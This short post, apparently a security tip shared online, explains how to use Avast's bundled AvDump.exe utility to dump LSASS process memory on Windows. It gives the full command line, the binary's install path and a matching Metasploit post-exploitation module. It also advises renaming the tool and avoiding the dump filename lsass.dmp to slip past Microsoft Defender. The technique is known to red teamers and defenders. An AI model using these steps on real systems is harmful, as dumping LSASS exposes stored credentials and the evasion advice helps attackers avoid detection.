Dumping LSASS with AV
Sometimes Antivirus is attackers' best friend. Here is how you can use Avast AV to dump lsass memory 
Commands: 
.\AvDump.exe --pid 704 --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file lsass.dmp
To bypass Microsoft Defender, remember to rename the AvDump.exe file. Also, don't use the name lsass.dmp (see screenshot).
There's also Metasploit post exploitation module for this under post/windows/gather/avast_memory_dump
AvDump.exe is located at C:\Program Files\Avast Software\Avast.
